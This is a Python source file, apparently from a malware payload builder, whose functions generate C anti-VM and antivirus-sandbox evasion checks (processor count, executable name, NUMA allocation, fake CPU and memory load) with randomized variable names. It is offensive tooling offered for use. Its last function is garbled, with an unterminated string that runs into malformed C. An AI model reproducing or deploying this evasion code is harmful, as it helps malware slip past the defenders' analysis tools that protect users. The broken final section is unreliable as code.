from lib import core
import random


# Add Anti-VM code
def THE_GREAT_EVASION(FILENAME):
    core.ADDING_EVASION()

    EVASION = ""
    EVASION += NUMBER_OF_CORE()
    EVASION += MY_NAME_IS(FILENAME)
    EVASION += MONO_CORE()
    EVASION += HARD_USAGE()

    core.EVASION_ADDED()

    return EVASION


def NUMBER_OF_CORE():
    # Check number of core
    SYSGUIDE = core.VARNAME_CREATOR()
    CORE = core.VARNAME_CREATOR()
    EVASION = "SYSTEM_INFO " + SYSGUIDE + ";\n"
    EVASION += "GetSystemInfo(&" + SYSGUIDE + ");\n"
    EVASION += "int " + CORE + " = " + SYSGUIDE + ".dwNumberOfProcessors;\n"
    EVASION += "if (" + CORE + " < 2){exit(0);}\n\n"

    return EVASION


def MY_NAME_IS(FILENAME):
    # Check if the begin name is the same
    B = core.VARNAME_CREATOR()
    FILENAME = FILENAME.replace('output/', '')
    EVASION = 'if (strstr(argv[0], "' + FILENAME + '") > 0){int ' + B + ' = 0;}\n'
    EVASION += "else{exit(0);}\n\n"

    return EVASION


def MONO_CORE():
    # AV have no multiproc
    MEM2 = core.VARNAME_CREATOR()
    EVASION = "LPVOID " + MEM2 + "= NULL;\n"
    EVASION += MEM2 + " = VirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);\n"
    EVASION += "if (" + MEM2 + " != NULL){\n"
    EVASION += 'printf("Hello World");}\n'
    EVASION += "else{exit(0);}\n\n"

    return EVASION


def HARD_USAGE():
    # Fake cpu/mem operation
    OP1 = core.VARNAME_CREATOR()
    OP1_VALUE = str(random.randint(6000, 8000))
    ITERATOR1 = core.VARNAME_CREATOR()
    MEM1 = core.VARNAME_CREATOR()
    MEM1_VALUE = str(random.randint(45000000, 60000000))
    EVASION = "int " + OP1 + "= " + OP1_VALUE + ";\n"
    EVASION += "int " + ITERATOR1 + " = 0;\n"
    EVASION += "for (" + ITERATOR1 + " = 0; " + ITERATOR1 + " < " + OP1 + "; " + ITERATOR1 + "++){\n"
    EVASION += 'printf("%d\\n", ' + ITERATOR1 + ');\n'
    EVASION += "char * " + MEM1 + " = NULL;\n"
    EVASION += MEM1 + " = (char * )malloc(" + MEM1_VALUE + ");\n"
    EVASION += "if (" + MEM1 + " != NULL){\n"
    EVASION += "memset(" + MEM1 + ", 00, " + MEM1_VALUE + ");\n"
    EVASION += "free(" + MEM1 + ");}\n"
    EVASION += "else{exit(0);}}\n"
    EVASION += "if (" + ITERATOR1 + " != " + OP1 + "){\n"
    EVASION += "exit(0);}\n\n"

    return EVASION

def DOG_CAT_OR_RAT():
    # back to first while :) EZ

    MINIMUM_NUMBER = core.VARNAME_CREATOR()
    MINIMUM_NUMBER_VALUE = str(random.randint(3000, 4000))

    MAX_NUMBER = core.VARNAME_CREATOR()
    MAX_NUMBER_VALUE = str(random.randint(5000, 6000))

    EVASION = "int " + MINIMUM_NUMBER + " = " + MINIMUM_NUMBER_VALUE + ";"
    EVASION += "int " + MAX_NUMBER + " = " + MINIMUM_NUMBER_VALUE + ";"
    EVASION += "int count_0 = 0;
    int
    stock_0 = rand() % (MAX_NUMBER + 1 - MINIMUM_NUMBER) + MINIMUM_NUMBER;

    int
    count_1 = 0;
    int
    stock_1 = rand() % (MAX_NUMBER + 1 - MINIMUM_NUMBER) + MINIMUM_NUMBER;

    int
    count_2 = 0;
    int
    stock_2 = rand() % (MAX_NUMBER + 1 - MINIMUM_NUMBER) + MINIMUM_NUMBER;

    int
    count_3 = 0;
    int
    stock_3 = rand() % (MAX_NUMBER + 1 - MINIMUM_NUMBER) + MINIMUM_NUMBER;

    int
    count_4 = 0;
    int
    stock_4 = rand() % (MAX_NUMBER + 1 - MINIMUM_NUMBER) + MINIMUM_NUMBER;

    int
    count_5 = 0;
    int
    stock_5 = rand() % (MAX_NUMBER + 1 - MINIMUM_NUMBER) + MINIMUM_NUMBER;

    int
    number_0;
    int
    number_1;
    int
    number_2;
    int
    number_3;
    int
    number_4;
    int
    number_5;

    while (count_0 != stock_0)
        {
            count_0 + +;
        int
        number_0 = rand() % (MAX_NUMBER + 1 - MINIMUM_NUMBER) + MINIMUM_NUMBER;

        int
        amalloc = rand() % (2000000 + 1 - 10000000) + 10000000;
        char * mem_0 = NULL;
        mem_0 = (char *)
        malloc(amalloc);

        if (mem_0 != NULL)
        {
        memset(mem_0, 00, amalloc);
        free(mem_0);
        }
        else
        {
        exit(0);
        }

    while (count_1 != stock_1)
        {
            count_1 + +;
        int
        number_1 = rand() % (MAX_NUMBER + 1 - MINIMUM_NUMBER) + MINIMUM_NUMBER;

        int
        amalloc = rand() % (2000000 + 1 - 10000000) + 10000000;
        char * mem_1 = NULL;
        mem_1 = (char *)
        malloc(amalloc);

        if (mem_1 != NULL)
        {
        memset(mem_1, 00, amalloc);
        free(mem_1);
        }
        else
        {
        exit(0);
        }

        while (count_2 != stock_2)
            {
                count_2 + +;
            int
            number_2 = rand() % (MAX_NUMBER + 1 - MINIMUM_NUMBER) + MINIMUM_NUMBER;

            int
            amalloc = rand() % (2000000 + 1 - 10000000) + 10000000;
            char * mem_2 = NULL;
            mem_2 = (char *)
            malloc(amalloc);

            if (mem_2 != NULL)
            {
            memset(mem_2, 00, amalloc);
            free(mem_2);
            }
            else
            {
            exit(0);
            }

            while (count_3 != stock_3)
                {
                    count_3 + +;
                int
                number_3 = rand() % (MAX_NUMBER + 1 - MINIMUM_NUMBER) + MINIMUM_NUMBER;

                int
                amalloc = rand() % (2000000 + 1 - 10000000) + 10000000;
                char * mem_3 = NULL;
                mem_3 = (char *)
                malloc(amalloc);

                if (mem_3 != NULL)
                {
                memset(mem_3, 00, amalloc);
                free(mem_3);
                }
                else
                {
                exit(0);
                }

                while (count_4 != stock_4)
                    {
                        count_4 + +;
                    int
                    number_4 = rand() % (MAX_NUMBER + 1 - MINIMUM_NUMBER) + MINIMUM_NUMBER;

                    int
                    amalloc = rand() % (2000000 + 1 - 10000000) + 10000000;
                    char * mem_4 = NULL;
                    mem_4 = (char *)
                    malloc(amalloc);

                    if (mem_4 != NULL)
                    {
                    memset(mem_4, 00, amalloc);
                    free(mem_4);
                    }
                    else
                    {
                    exit(0);
                    }

                    while (count_5 != stock_5)
                        {
                            count_5 + +;
                        int
                        number_5 = rand() % (MAX_NUMBER + 1 - MINIMUM_NUMBER) + MINIMUM_NUMBER;

                        int
                        amalloc = rand() % (2000000 + 1 - 10000000) + 10000000;
                        char * mem_5 = NULL;
                        mem_5 = (char *)
                        malloc(amalloc);

                        if (mem_5 != NULL)
                        {
                        memset(mem_5, 00, amalloc);
                        free(mem_5);
                        }
                        else
                        {
                        exit(0);
                        }

                        }
                    }
                    }
                    }
                    }
                    }
                    }
